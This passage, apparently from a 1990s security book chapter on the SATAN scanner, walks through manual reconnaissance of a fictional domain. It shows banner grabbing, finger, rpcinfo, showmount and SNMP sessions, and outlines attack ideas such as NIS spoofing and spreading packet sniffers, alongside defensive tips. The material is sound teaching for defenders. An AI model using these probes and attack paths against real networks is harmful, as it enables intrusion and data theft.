came from an SGI IRIX system, but there is no way to tell that for sure from this prompt.
% ftp m4.notreal.com
Connected to m4.notreal.com.
220 m4 FTP server (SunOS 4.1) ready.
This is a Sun OS 4.1 system. The hacker does not need to use the system command. (It
actually does not allow a system command.)
% ftp mail.notreal.com
220 mail FTP server (Version wu-2.4(10) Mon Nov 21 17:34:06 PST 1994) ready.
This one is interesting. It is running the wu-ftpd, the leading ftpd implementation. This
popular ftpd offers extensive functionality. An older version of wu-ftpd had a security hole
with the SITE EXEC protocol statements, discussed later in this chapter, that is checked for by
SATAN. Unfortunately, wu-ftpd gives no information on the system type.
% ftp sys3.notreal.com
220 sys3 FTP server (Version 4.1 Sat Aug 27 17:18:21 CDT 1994) ready.
ftp> system
215 UNIX Type: L8 Version: BSD-44
SATAN and the Internet Inferno 451
The Version 4.1 is an IBM AIX version number; however, the BSD-44 does not guarantee that
the system is an IBM AIX source, because others could give this same answer.
% ftp sys4.notreal.com
Connected to sys4.notreal.com.
220 sys4 FTP server (Version 1.7.193.3 Thu Jul 22 18:32:22 GMT 1993) ready.
ftp> system
215 UNIX Type: L8
This system gives no information at all; it came from an HP-UX 9.x workstation. The only
thing that might give it away is the version number, but this is no certainty, because other
versions of Unix might put a similar RCS type number in the Version banner.
sendmail Information
By talking directly to the SMTP port, TCP port number 25, a hacker can ask the SMTP
daemon, almost always sendmail, to provide information on the remote system and on itself.
sendmail is a great source of security holes, because it typically runs set-uid to root, consists of
tens of thousands of lines of C code, has a large and complex configuration file that is customized
by every user, and is run on every host that acts as a transport agent for e-mail on the
Internet. Non-Unix systems such as Macs or PCs that want to send Internet e-mail will
typically make a direct connection to a Unix system running sendmail. The Macs or PCs do
not typically act as mail transport agents on the Internet.
The hacker would like to get information on the host OS and the version of sendmail. He
could also use EXPN (expand), HELP, and VRFY to identify information such as the identity
of the postmaster (a requirement for all mail hosts), root, guest, webmaster, ftp, uucp, lp, and
www. The hacker is quite interested in finding mail expansions that indicate programs, files, or
mailing lists.
If sendmail is configured to permit EXPN, the sendmail aliases file is read and the expansion
corresponding to the entry is returned. If only VRFY is permitted, the hacker can still verify
the existence of accounts in the /etc/passwd file. A utility program, expand_alias, is available
that can automate expansion searches.
For an example, here is what the hacker sees when interrogating sendmail on the systems in
notreal.com:
% telnet dns1.notreal.com 25
220 dns1.notreal.com. Sendmail 5.0/SMI-SVR4 ready at Sat, 11 Nov 95 19:47:37 PST
Note sendmail typically reports back the version of the binary as the first field after the
name sendmail in the initial banner, followed by a / and the version of the configuration
file. This is configurable via the sendmail.cf file and may differ on some
machines.
452 Part II: Gaining Access and Securing the Gateway
The sendmail binary appears to have a 5.0 version, and the config file has an SMI-SVR4
version. The SMI stands for Sun Microsystems Inc., and 5.0 stands for the Sun OS 5.0 or
Solaris 2.0 system.
% telnet m2.notreal.com 25
Connected to m2.notreal.com.
220 m2 Sendmail 5.65v3.2 (1.1.3.6) Sat, 11 Nov 1995 20:04:27
The binary says 5.65v3.2, which indicates that it is version 5.65 of sendmail. The 3.2 appears
to hint that this is an IBM AIX system, but this is really not the case. Recall from the ftpd
banner that this system is a DEC OSF/1 box. Notice that the config file version information is
separated by a space and surrounded by parentheses. It appears to be an RCS version number.
This could be useful when reverse-engineering patches that included security fixes.
% telnet m3.notreal.com 25
220 m3.notreal.com Sendmail 931110.SGI/930416.SGI ready at Sat, 11 Nov 95
19:54:12 -0800
This is clearly the SGI system. Notice the dates of the sendmail binary (931110.SGI) and
sendmail config file (930416.SGI). This is useful if a hacker finds that a sendmail security hole
occurred after the given date in the header string. Luckily for this intruder, there have been
several sendmail holes since November 93. A hacker can find details on that by studying the
CHANGES file for the latest sendmail available from UCB.
% telnet m5.notreal.com 25
220 m5. Sendmail 4.1/SMI-4.1 ready at Sat, 11 Nov 95 19:53:48 PST
SMI tells you that this is a Sun OS, and 4.1 indicates the version of the Sun OS. There is no
information on the version of sendmail, although you can make assumptions based on the OS
version.
% telnet sys3.notreal.com 25
220 sys3.notreal.com Sendmail AIX 4.1/UCB 5.64/4.03 ready at Sat, 11 Nov 1995
20:22:55 -0800
This banner is quite clear about the OS version (IBM AIX 4.1) and the sendmail version
(5.64). This is quite useful.
% telnet mail.notreal.com 25
220 mail.notreal.com ESMTP Sendmail 8.7/8.7; Sat, 11 Nov 1995 20:05:52 -0800 (PST)
This system is running the latest version of sendmail from the UCB distribution.
% telnet sys4.notreal.com 25
220 sys4.notreal.com HP Sendmail (1.37.109.8/15.6) ready at Sat, 11 Nov 1995
21:36:36 -0800
This system clearly announces that it is an HP (HP-UX) system. Although the ftpd on HP-UX
did not announce the OS type, the sendmail daemon does. No real information on the version
of the daemon, though.
SATAN and the Internet Inferno 453
Note The amount of information gained by interrogating each network daemon on the
target systems can easily overwhelm an intruder. A nice report and summary tool
could be quite useful, and SATAN provides this. In the absence of such a tool,
perhaps a spreadsheet or custom database could help maintain the information.
The list of sendmail holes is quite lengthy; however, the latest sendmail from
ftp.cs.ucberkeley.edu (currently 8.7.2) nearly always has patches for all known holes.
Running that sendmail, or making sure your vendor has all patches that this version contains,
can make your system as safe as it can be. Using smrsh and a small list of permissible programs
can also improve your sendmail security, as can disabling VRFY and EXPN, although this does
remove some of the usefulness of the e-mail infrastructure.
UDP/TCP Scan
The hacker now wants to gain information about the remote system’s /etc/inetd.conf file,
which contains a list of services offered by inetd. SATAN includes programs that attempt to
connect to each UDP and TCP port. The hacker can write similar socket programs to do this,
but it is, once again, much easier to use SATAN.
The Internet operates under the assumption of well-known ports, as described in RFC 1700
“Assigned Numbers.” The /etc/services file provides a list that can be used to make assumptions
on the service listening to the port that accepted a connect during the scan.
For TCP, telnet can be used to try a connect to a particular port. For example:
% more /etc/services
# This file associates official service names and aliases with
# the port number and protocol the services use.
# The form for each entry is:
# <official service name> <port number/protocol name> <aliases>
echo 7/tcp # Echo
echo 7/udp #
discard 9/tcp sink null # Discard
discard 9/udp sink null #
systat 11/tcp users # Active Users
daytime 13/tcp # Daytime
daytime 13/udp #
...
% telnet dns1 echo
Trying...
Connected to dns1.notreal.com.
Escape character is ‘^]’.
one
one
...
% telnet sys3 echo
Trying...
454 Part II: Gaining Access and Securing the Gateway
telnet: Unable to connect to remote host: Connection refused
% telnet dns1 13
Trying...
Connected to dns1.notreal.com.
Escape character is ‘^]’.
Sat Nov 11 22:22:34 1995
Connection closed by foreign host.
%
Here the hacker finds that sys3 does not offer the echo service, whereas dns1 does offer it, as
well as the daytime (TCP/13) service.
For manual TCP scans, a hacker can use telnet or the SATAN TCP scanner. For UDP scans,
the hacker must make a program or use the SATAN UDP scanner. Other port scanners are
available at FTP archives such as COAST.
Tip You can use TCP wrappers to prevent unauthorized remote systems from successfully
making TCP or UDP connections to local services. Wietse Venema’s
tcp_wrappers is one of the most popular such programs, although several vendors
include similar functionality into inetd, via inetd.sec or xinetd. Xinetd also offers a
good deal of flexibility in controlling services and minimizing risks.
At this point, the hacker has spent quite a bit of time manually interrogating ftpd, sendmail,
and telnetd to gather information on the remote system from banner comments. The hacker
has also gained information on which services are offered on the remote system. A manual scan
for this information can take ten minutes per host. The hacker can use SATAN to scan
hundreds of hosts for this information in a few seconds. Not only will SATAN do the scan,
SATAN will generate summary reports, and build a database of discovered systems that can be
automatically scanned. Although manual scans, as demonstrated in this section, are useful for
understanding and expanding SATAN, they are quite slow and inefficient.
Portmap Information
Internet network services are offered primarily through three mechanisms: network daemons
that constantly listen to a port, network daemons that use inetd to listen to a port and are
invoked when a connection request is caught by inetd, and rpc services that use the portmap
program to dynamically assign a port in response to a request for that particular program. The
most popular rpc services are NIS and NFS, both of which offer much to the intruder.
The rpcinfo program interrogates a remote portmap program and indicates what services are
available. A hacker looking at the notreal.com systems would see something such as this (for
brevity’s sake, TCP versions have been deleted):
% rpcinfo -p m2.notreal.com
program vers proto port
100000 2 udp 111 portmapper
SATAN and the Internet Inferno 455
100007 2 udp 877 ypbind
100005 3 udp 1027 mountd
100003 3 udp 2049 nfs
100024 1 udp 1028 status
100021 4 udp 1031 nlockmgr
100020 3 udp 1033 llockmgr
100011 1 udp 1036 rquotad
100017 1 tcp 1025 rexd
100001 3 udp 1029 rstatd
100002 2 udp 1031 rusersd
100008 1 udp 1033 walld
100012 1 udp 1036 sprayd
150001 2 udp 1038 pcnfsd
100026 1 udp 1036 bootparam
100028 1 tcp 1094 ypupdated
100004 2 udp 716 ypserv
100009 1 udp 1023 yppasswdd
The interesting services to note are nfs, ypbind, ypserv, ruserd, bootparam, mountd, and rexd.
The others are useful too, so the hacker records all this information into an ever-expanding
database. SATAN scans the list of services offered by the portmap program and specifically
looks for the presence of nfs/mountd, yp/NIS, and rexd. All three of these services have been
associated with security holes. Note that some portmaps permit remote unregistration and
registration of programs, allowing a remote hacker to modify the portmap database. The newer
version of portmap is called rpcbind; it still features the same issues.
Tip A secure portmap program and rpcbind are available from Wietse Venema, one of
the creators of SATAN and the creator of tcp-wrapper. A system admin can configure
this portmap to respond only to requests from authorized network addresses.
Although this can be circumvented using IP spoofing, it does improve security. This
program also includes several security improvements such as the elimination of
request forwarding.
Boot Information
If SATAN discovers that a system’s portmap program offers the bootparam service, SATAN
will scan that service and learn the NIS domain name. SATAN focuses on the first phase of a
network attack, gaining remote access, and does not try to interrogate the bootpd server;
however, the bootpd server offers an intruder an excellent way to carry out phase three of an
attack. If the intruder has gained root access to a system, the intruder can exploit vulnerabilities
offered by bootpd. SATAN will list the systems running bootpd, and the vigilant intruder
will try to attack these systems once he or she has gained access to any system on the same
LAN segment.
After the hacker has gained access to a system on the same LAN segment as the bootpd server,
the hacker can identify the LAN addresses of the remote server by first pinging it. The ping
causes the compromised system to generate an ARP request packet that the remote server
456 Part II: Gaining Access and Securing the Gateway
responds to with a packet containing its LAN address. The hacker then dumps the arp cache of
the compromised system. This requires the hacker to be on the same LAN segment, or else the
LAN address is just that of the nearest router. Once again, SATAN is useful in the first phase
of an attack, when trying to gain initial access to a remote system. This discussion of bootpd is
related the third phase of an attack: extended access by using additional vulnerabilities, in this
case vulnerabilities only available to systems on the same LAN.
Of course, if the hacker is on the same LAN segment, the hacker can spoof the arp requests
and impersonate hosts, a major vulnerability. Therefore, a more realistic attack might come
from a brute force sequencing through all the possible LAN addresses. The first three parts of
the LAN address are fixed by the manufacturer and are widely available. The last three parts
vary by system, offering a total of 255´255´255 = 16 million combinations. A real attack
could generate 16 million bootpc request packets; perhaps they would start the attack on a
Friday evening and run it until they got lucky. Some intelligent sequencing may even be
possible. A hacker could try to map a pattern of the LAN address scheme on a vendor’s system
versus the system and shipment date and then use previously gained information to narrow the
search space.
Assuming that the hacker is able to get the LAN address, the hacker can now get information
on the boot file that the bootpd (dhcp) server offers to boot clients. (Note that some Unix
systems, notably Sun, use the rpc bootparam method for providing this information, rather
than a bootpd server.) Here is an example of being on the same LAN and using ping to grab
the LAN address:
% ping sys4.notreal.com
PING sys4.notreal.com: 64 byte packets
64 bytes from 12.3.45.67: icmp_seq=0. time=2. ms
% arp -a
sys4.notreal.com (12.3.45.67) at 8:0:9:01:23:45 ether
% bootpquery 080009012345
Received BOOTREPLY from m4.notreal.com (12.3.45.78)
Hardware Address: 08:00:09:01:23:45
Hardware Type: ethernet
IP Address: 12.3.45.67
Boot file: /usr/lib/uxbootlf.700
RFC 1048 Vendor Information:
Subnet Mask: 255.255.248.0
Gateway: 12.3.45.6
Domain Name Server: 12.3.4.56
Host Name: sys4
%
The bootpquery program is a simple HP-UX program that generates a bootp request and
formats the reply. A comparable program is easy enough to generate on other Unix systems.
SATAN and the Internet Inferno 457
The information returned by bootpd is quite useful. The bootp packets contain IP and
hostname information about systems that boot their kernels over a network connection to a
server. The bootp packets also indicate a boot server system that supplies boot files and boot
configuration information to client systems that boot over the network. An intruder can try to
corrupt boot data on the server or try to masquerade as a boot server to the client.
If the remote systems are using the rpc bootparam method instead of the bootpd method, the
hacker can get the information via the portmap program on the systems that showed
bootparam on the rpcinfo -p list.
By crafting an rpc program that does a callrpc() for BOOTPARAMPROC_WHOAMI, the
hacker can get the same information, as well as the NIS domain of the systems, which can then
be used to request NIS maps, such as passwd, from the ypserv program. A program called
bootparam that gets such information is included as part of SATAN.
Tip A system administrator should never permit a boot server to be available for Internet
access. The firewalls should be configured to screen out packets on the bootp (67/
UDP, 68/UDP, 1067/UDP, 1068/UDP) and portmap ports (111/UDP, 111/TCP).
finger, rusers, and rwho
Some consider the finger program to be one of the most dangerous tools for information
leakage. Although it provides useful information for monitoring remote hosts, it provides even
more useful information for hackers who are trying to build up databases of information about
the target systems. A comparable rpc program, rusers, is frequently available even when fingerd
is not. A third program, rwho, also provides similar information.
First, the hacker uses finger @<systemname> to get a list of users who are currently logged on.
Then the hacker tries using login names at each system, such as root, bin, guest, ftp, tftp,
daemon, sync, and usernames that the hacker has already discovered. This should result in a
bonanza of information for the hacker’s growing database:
% finger @m2.notreal.com
[m2.notreal.com]
Login Name TTY Idle When Office
root system PRIVILEGED ac *:0 Fri 11:41
root system PRIVILEGED ac p2 8d Fri 11:56
bkelley Bob Kelley p4 5d Tue 15:14 Bldg 52 X71111
% finger root@m2.notreal.com
[root@m2.notreal.com]
Login name: root (messages off) In real life: system PRIVILEGED
account
Office: Bldg 43, x71111
Directory: / Shell: /bin/sh
On since Oct 27 11:41:13 on :0
On since Oct 27 11:56:39 8 days Idle Time on ttyp2
458 Part II: Gaining Access and Securing the Gateway
On since Nov 3 13:46:00 8 days Idle Time on ttypa from m4
On since Nov 3 15:52:41 8 days Idle Time on ttypb from m3
% finger ftp@m3.notreal.com
[m3.notreal.com]
Login name: xxftp In real life: anonymous ftp
Directory: /users/ftp Shell: /bin/false
Never logged in.
No Plan.
% finger bin@m3.notreal.com
[m3.notreal.com]
Login name: bin In real life: System Tools Owner
Directory: /bin Shell: /dev/null
Never logged in.
No Plan.
% finger guest@m3.notreal.com
[m3.notreal.com]
Login name: guest In real life: Guest Account
Directory: /usr/people/guest Shell: /bin/csh
Last login at Wed Jul 12 17:39 from mabel@halifax.com
No Plan.
A hacker uses finger to build up a copy of the /etc/passwd file, with new information on login
names, home directories, login shells, last login information (tty, system used to login from,
and date last logged in), and even information about the individual (phone, address, and so
on). This information can be useful as vulnerabilities are discovered. If the hacker discovers
that /usr is NFS exported, for example, the hacker would like to know any users that have a
home directory in /usr (such as guest above). This would permit the hacker to launch .rhoststype
attacks against this user.
Tip Avoid enabling fingerd in inetd. The tcp-wrapper can restrict remote access to
fingerd if finger information is absolutely necessary for the network.
The rpc equivalent of fingerd is rusersd. If the remote system indicates through the rpcinfo -p
printout that rusersd is a registered rpc service, running rusers -l <remote system> generates a list
comparable to that generated by finger @<remote system>. The output is very similar to who or
rwho. rusers does not allow a query for information about an individual user. SATAN uses
rusers to gather information about remote systems:
% rusers -l mail.notreal.com
bkelley mail:ttys0 Oct 04 12:23 115:28 (m2.notreal.com)
perry mail:ttys2 Oct 25 14:53 607:20 (sys1.notreal.com)
chris mail:ttys3 Oct 06 08:16 473:41 (sys2.notreal.com)
stan mail:ttys7 Sep 22 10:03 126:18 (m3.notreal.com)
mabel mail:ttys9 Oct 16 15:42 447:27 (m4.notreal.com)
www mail:ttysb Oct 10 08:27 65:27 (sys2.notreal.com)
The third program, rwho, depends on a daemon called rwhod that does periodic network
broadcasts of who is on a system to other rwhod programs. This is not very useful for hacking
SATAN and the Internet Inferno 459
because a hacker cannot directly interrogate the rwhod, but he must run a rwhod to listen to
broadcasts. Because the broadcasts don’t go past the local LAN segment, the hacker never sees
an update.
Note A number of Web sites that feature username searches are available from the Yahoo
White Pages Web page at http://www.yahoo.com/Reference/White_Pages.
NFS Export Information
For those systems that indicate a mount service via the rpcinfo -p list, the showmount program
can interrogate rpc.mountd for details. The showmount -a command prints out a list of which
hosts have mounted the exported file systems. The showmount -e command requests a list of
file systems that are exported via NFS as well as the authorization list for those file systems:
% showmount -e dns1.notreal.com
export list for dns1.notreal.com:
/tmp sys2,sys3
/usr (everyone)
/export/home (everyone)
/var (everyone)
/cdrom (everyone)
/ m2
% showmount -a dns1.notreal.com
m2.notreal.com:/
m3.notreal.com:/usr
sys2.notreal.com:/tmp
Because NFS depends on client-side authentication, a hacker can use one of the many NFS
hacking tools, such as nfsbug, nfsshell, or nfsmenu, to gain read and write access to the
exported file systems. SATAN scans for unrestricted NFS access and indicates this as a
potential problem in its reports.
An analysis of the exported file system can offer some insights at vulnerable points. The
/cdrom file system is probably acceptable, because it is read-only, as long as the cdrom does not
contain private information. The /tmp file system is also probably acceptable, because of the
inherent understanding by most users and programs of the lack of security.
The /usr directory is probably acceptable if it is exported read-only, because it usually contains
binaries. However, many programs depend on /usr/tmp, increasing the likelihood of this
directory being writeable. If the directory is writeable and binaries are owned by non-root
users, the integrity of the binaries is at risk.
/export/home is probably a directory of user home directories that are exported with read and
write permissions. This is a major vulnerability if the system permits .rhosts files, .Xauthority
files, or .netrc files for FTP logins.
460 Part II: Gaining Access and Securing the Gateway
By gaining access to the /var/yp directory of a system that is a yp/NIS server, as indicated by
the portmap information, you can determine the domain name for yp/NIS. The domain name
is the name of the subdirectory of /var/yp. If you have write access to that system via NFS, you
can rewrite the passwd map files and distribute them to all the yp/NIS clients in the domain.
Tip NFS should never be accessible to the Internet. When used, it should be read-only if
possible. It should never permit root access with write capability. Hackers can cope
with only so much laughter.
NIS Information
An NIS server (ypserv) distributes maps on major system files to all systems inside an NIS/yp
domain. These maps include passwd, hosts, aliases, services, and others. The NIS server
transfers a map to any ypbind client that knows the domain name. There are several ways to
get the NIS domain name: the bootparam method (mentioned previously and used by
SATAN), the NFS server method (also mentioned previously), and intelligent guessing (also
used by SATAN). The domain name is frequently something descriptive and easy-toremember,
to help internal users. For example, notreal might be a good guess for the NIS
domain for notreal.com. The ypx program can help guess a domain name and transfer an NIS
map from the NIS server.
Of course, the hacker could always busy the NIS server with a denial of service type of attack
(hundreds of FTP, telnet, or smtp requests), causing the response time to an NIS client’s
request to be slow enough to cause the NIS client to broadcast a request for a new NIS server
to bind to. The hacker could then answer this request and have the client bind to the hacker’s
system, and distribute the passwd map to this client. At this point, the hacker has control over
the target system.
Tip NIS should never be accessible to the Internet and should not be used in a potentially
hostile environment. NIS domain names should be quite cryptic and
unguessable. NIS+ tries to address many of these issues and should be considered
as a replacement.
Web Server Information
SATAN, as currently distributed, does not include any scans for Web server vulnerabilities.
Although the only Web server vulnerabilities discovered have been related to the https (SSL
version of http) services, the dynamic growth of Web server functionality will certainly lead to
vulnerabilities. A system administrator can easily add scans for these yet-to-be-discovered
vulnerabilities to SATAN; an example of adding scans to SATAN is included at the end of this
chapter.
Even though there are no current Web server vulnerabilities, Web servers are a source of
information leakage. Although no indirect information leakage occurs via the httpd on the
SATAN and the Internet Inferno 461
remote systems, the direct, or intended, information leakage from Web pages can be useful. By
using a Web browser, a hacker can find information about users and systems in the remote
network. It is possible to make an automated program that would recursively interrogate the
http port (TCP/80), doing GET <page> where <page> is /index.html or similar Web page
paths, scanning the pages for addresses with the domain notreal.com. (PERL would seem ideal
for this task.) A comparable scanner for the https (a cryptographically secure version of http
that uses SSL, usually on TCP/443) could be constructed using either sslref2.0 or SSLeay.
(See the section on SSL for details.) SATAN could easily be modified to support such Web
scanners.
By creating a Web site and having members of notreal.com connect to it, a hacker can gain
information about the client systems. Some Web browsers will send information about the
local environment and URLs. Of course, such an approach can be extended to making
corrupted binaries, Java pages, PostScript documents, or e-mail messages. This is moving from
passive information gathering to active deception, but a malevolent intruder is not troubled by
this.
Note A useful Web site for looking up user e-mail addresses is http://okra.ucr.edu/
okra/. By specifying the first and last name of a person, the remote system searches
a database built up from network news posts.
NNTP Information
SATAN does not scan for information available through network news. NNTP really is a
useful source of gaining hostname information, however. It is possible to scan every posting to
network news for addresses ending in notreal.com. These could be part of e-mail addresses of
the posters from within notreal.com, or part of messages posted by notreal.com users. In either
case, such postings provide another source of information leakage regarding notreal.com’s
systems and users.
The nntpd has the potential for attacks, similar to smtp, but is protected to a certain extent by
being able to select which hosts can connect to it. Having embedded MIME statements in
news postings can be a hidden danger if the newsreader, such as tin or Netscape, can interpret
them. For example, if you have a MIME statement that does an external FTP for the .rhosts
file, this could open your system to a trust attack.
Routing Information
The gated routing program broadcasts routing tables to other routing daemons. These packets
can be used to build up a picture of the routing tables (netstat -r) on each of the systems in
notreal.com. They also help to add hostnames to the list of systems in that domain. Knowing
that gated is running can be useful because this program is vulnerable to trusting routing
packets from unauthenticated sources. SATAN indicates whether or not a system is running
gated.
462 Part II: Gaining Access and Securing the Gateway
identd Information
SATAN’s TCP scan discovers whether or not a system is running an identd server, such as
pidentd. Programs such as idlookup enable you to determine information about the originator
of a network connection to your system. If the originator of the connection is on a system that
runs pidentd, information about the system type, the local nationalization variables, and user
are available. If you can get a user to connect (by sending mail to you, ftping to you, or using a
Web browser to connect to your Web site), you can use idlookup to gain this information.
By using IP spoofing and source routing, a hacker can masquerade as a host that has a current
open connection and do a brute force search for user information.
If a hacker knows that a large server is accessed by a client at a certain IP address, for example,
the hacker can do multiple connects to the auth port on the large server, masquerading as the
client (perhaps using the FTP server bounce vulnerability), indicating the shell or login ports as
destination ports on the server, and scanning all possible ports on the client. Each successful
match would provide the hacker with the login name of a user who is using either remsh (rsh)
or rlogin to gain access to the server. These users would be possible victims for an .rhosts
attack.
Packet Sniffing
Although packet sniffing is more closely related to the third phase of a network attack, and
SATAN deals mainly with detecting first phase vulnerabilities, packet sniffing is still one of the
most commonly used Internet attacks.
If a hacker can put a packet sniffer on major routes across the Internet, the hacker could use
filtering rules to watch for connections going into or out of notreal.com. Then any connection
for FTP, telnet, rlogin, or SMTP would permit the hacker to catch a password or other
information. Capturing X authority information, NIS maps, or DNS maps can also be quite
useful.
By widely distributing packet sniffers to many locations, perhaps by surreptitiously placing
them onto sites with minimal security, the odds of catching such connections increase. Even
if the hacker sees only a password for a user on an outgoing connection, a login/password
combination is useful knowledge because most users use only a limited number of different
passwords. In addition, cracking the account of that user on a remote system would perhaps
permit the hacker to leverage that intrusion to gain access to notreal.com.
The tcpdump program is a packet sniffer that uses streams dlpi to monitor all traffic going
across a system’s network interface. It could be used to provide an example of how to embed a
packet sniffer into another program in a virus type format. This program could then be
distributed, and when run on the unsuspecting victim’s system, it would capture information
and retransmit it to the intruder’s system.
SATAN and the Internet Inferno 463
Note tcpdump and libpcap are available from the CIAC archives at http://
ciac.llnl.gov. These programs use the /dev/nit device or the streams dlpi interface
to put the network interface into promiscuous mode. When tcpdump is run, it prints
out the contents of each packet that passes by the network interface. Command-line
filters allow tcpdump to just watch for mail, telnet, transfer to certain hosts, or other
selection criteria. libpcap offers a library of routines that monitor LAN traffic. Not all
network interfaces support the promiscuous mode, so check with your vendor first.
IP Layer Information
A hacker would like to know if the target systems permit IP source routing and IP forwarding.
These two features can be quite useful. The traceroute program is a useful vehicle for this;
using the -g option for loose source routing, or by modifying it for full source routing, the
intruder can source route a packet to the target and attempt to get a reply. Unfortunately,
SATAN does not scan for this functionality.
If the target system has a weak firewall implementation, such as something that does only
application-level filtering, the hacker could try to get the transport layer to send a packet into
the network by using IP forwarding.
A recent RFC, 1858, discusses a security vulnerability that could result from the fragmentation
of IP packets occurring at breakpoints inside the TCP header. If a hacker is able to see such
fragmentation occurring, by packet sniffing, the hacker can try to exploit it by intercepting the
connection and spoofing portions of the TCP header. The hacker might even be able to cause
such fragmentation on intermediate routers by heavily loading them down with traffic at the
appropriate time.
X11 Information
An improperly configured X Windows server is a major vulnerability. If the user executes
xhost +, that user has disable access control to the X Windows server, permitting any remote
user to gain control over it. By using an XOpenDisplay() call to the target system, a hacker can
identify if access controls permit a remote user to capture control over it. SATAN claims to
include a program called opendisplay that does this; actually, SATAN uses xhost to determine
this information. The SATAN reports indicate whether or not remote systems have X Windows
access control.
rexd Information
If rexd is listed in the portmap services, the target system most likely permits execution of
commands from any remote system by using the on command. An option to rexd can require
the remote system to be listed in the hosts.equiv file, but this option is not the default. Even if
the remote system hostname must be listed in hosts.equiv, the security is weak. A hacker can
464 Part II: Gaining Access and Securing the Gateway
try to poison a dns cache with face resource records to circumvent this security. rexd is an
inherently insecure service that should be used only behind firewalls and on secure networks.
SATAN includes a scan for rexd.
SNMP Information
SNMP is a server that facilitates network management by permitting remote programs, such as
HP’s OpenView Network Node Manager, to gather information about hosts and routers. This
also permits a hacker to gather information about remote hosts and routers.
Each SNMP request includes a community name, which authenticates the access request to the
snmpd program on the target. There are two kinds of requests:
n SNMP GetRequest. Permits the remote user, or manager, to read a system variable
(MIB).
n SNMP SetRequest. Permits the manager to alter an MIB value. An MIB corresponds
to a system setting.
The standard snmpd (both v1 and v2) distribution comes from CMU and includes many
incredibly useful tools for gathering information about remote sites. SNMP applications are on
ftp://lancaster.andrew.cmu.edu/pub/snmp-dist/.
The three most useful applications are snmpget, snmpnetstat, and snmpwalk. A hacker can use
snmpget to talk directly to the snmpd on the target system, requesting information and
changing system variables (MIBs). The snmpnetstat utility can be used by a hacker to effectively
run netstat on the remote system. Here is an example:
% snmpnetstat -v 1 sys2 public
Active Internet Connections
Proto Recv-Q Send-Q Local Address Foreign Address (state)
tcp 0 0 sys2.notreal.com.telne m2.notreal.com.2409 ESTABLISHED
tcp 0 0 sys2.notreal.com.telne m1.notreal.com.2895 ESTABLISHED
...
The snmpwalk generates a printout of vast amounts of information about the remote system,
much of it related to kernel transport status.
The only authentication done by snmp v1 is that the request requires knowledge of the remote
community name, which is configured in the /etc/snmp.conf file. The default community
name is public.
By default, remote users cannot alter MIB values but can read all MIB values. If the snmp.conf
file has a set-community-name setting, remote managers can do SNMP SetRequests, permitting
them to modify the local system’s MIB values. The remote user just needs to guess the
community name. If the snmp.conf file has a get-community-name setting, the remote users
must provide the community name before gaining access to MIB values.
SATAN and the Internet Inferno 465
Although snmp v1 is useful for gaining system and routing information, the new snmp v2 has
adequate security to prevent most attacks. Even though v2 is available from the same source as
v1, the vast majority of systems seem to support v1 or both v1 and v2. SATAN does scan for
the presence of snmpd, but does not interrogate the server for information.
Other Weak Points
SATAN’s port scanning may reveal the presence of gopher, uucp, talk, ntp, relay chat, and
systat services. While major vulnerabilities in these services are not popularly known, their
presence may be useful as new vulnerabilities are discovered. SATAN only scans for the
presence of these services; SATAN does not attempt to gather more information or search for
vulnerabilities in these services. Although uucp used to be very helpful for attacking systems, its
usage has dropped considerably. An interesting uucp hole is one where many sendmail aliases
included a uudecode alias that would automatically invoke the uudecode command on an
incoming mail message.
Similarly, gopher’s popularity has declined dramatically as the popularity of the World Wide
Web has gained. Most gopherd also provide access controls that can screen out undesired
connections.
talk is still a useful attack point, because it permits a remote user to write to a user’s tty,
perhaps invoking commands and actions. ntp can be used to modify a system’s time, but this is
more a denial of service attack than a useful vulnerability. relay chat is interesting, but it offers
little for attack and will certainly waste your time. relay chat can help you to build up a
database of users and system names. Finally, systat is rarely seen but remains a great source of
information when it is present.
Completion of the Manual Scan
At this point, the hacker has completed manually scanning the remote system for potential
phase one vulnerabilities. This corresponds to the completion of a SATAN scan. Whereas the
hacker took perhaps four hours to complete the above scans against a single host, SATAN
could easily run the same scans against that host in seconds. In addition, SATAN would
generate reports and databases of additional hosts to scan in the future. It is important for a
system administrator to realize the manual approach to phase one attacks: SATAN only
includes a subset of the possible scans, as mentioned throughout the preceding manual scan
demonstration. A vigilant system administrator should consider adding additional scans to
SATAN to cover all possible vulnerabilities.
Know the Code
The best way to know possible vulnerabilities is to study the code of Internet services. Most
vendor code is based on publicly available source, from BSD, ATT, Sun, or private locations.
Hackers get this source and study it for clues.
466 Part II: Gaining Access and Securing the Gateway
The Linux distributions are extremely helpful in understanding the operation of most programs.
Even the latest and greatest code from vendors typically has comparable Linux source
code. For example, NIS+ from Sun has a cousin in Linux called NYS. One popular Linux FTP
site is ftp://sunsite.unc.edu.
The BSD44 distribution is available on CD-ROM from many bookstores now and is useful in
understanding the transport layer implementation as well as many of the standard services,
such as rlogin or inetd.
Some of the most popular private distributions follow:
n sendmail: ftp://ftp.cs.berkeley.edu
n bind: ftp://gatekeeper.dec.com/pub/misc/vixie
n wu-ftpd: ftp://wuarchive.wustl.edu
n httpd: http://www.ncsa.uiuc.edu
n firewall kit: ftp://ftp.tis.com
Try All Known Problems
Problems are not all fixed simultaneously. One vendor might fix one problem on one platform,
but the other platforms from that vendor won’t be fixed until later, and platforms from other
vendors won’t be fixed for quite some time later. So hackers reverse-engineer patches, search
for security implications of those patches, and test all of notreal.com’s systems for these holes.
One major vendor estimated that many security patches are reverse-engineered within a day of
release—sometimes within hours.
Some Unix problems are re-opened in new releases, or are never really closed. Hackers build
up a catalog of problems and try them on new platforms, products, and releases. Has there ever
been a new Unix OS release that didn’t have at least one set-uid root script?
The hacker has gathered quite a bit of information on the remote systems in notreal.com’s
domain. At this point, an hacker should be able to identify some weaknesses—a system that
offers unrestricted NFS exports or X Windows server access, for example.
Match Vulnerabilities with Opportunities
After building up a database of existing and past security holes, and then building up a
database of a target organization’s systems and configurations, the hacker can now try to crosscorrelate
opportunities and take advantage of them.
SATAN and the Internet Inferno 467
As an example, any weaknesses in sendmail, due to old versions or configuration mistakes,
might permit the sending of the /etc/passwd file. A copy of the real passwd file could be in the
anonymous FTP ˜ftp/etc directory. An accessible X Windows system can allow a hacker to take
control of the target. An NIS server or client can offer access to system maps. An NFS server
can offer access to file systems. The presence of a tftpd, and the knowledge of the file system
for the system type, might permit the uploading of a corrupt configuration or boot file onto
the boot server. The tftpd might permit the downloading of files from any directory. The ftpd
might allow an intruder to put an .rhosts into the ˜ftp directory. A new system might not have
passwords for all accounts.
Look for Weak Links
If the network scans don’t reveal any vulnerabilities, the hacker may need to resort to nonnetwork
attacks.
The hacker might try a “Wargames” or “war dialer” type of dialing attack to determine modem
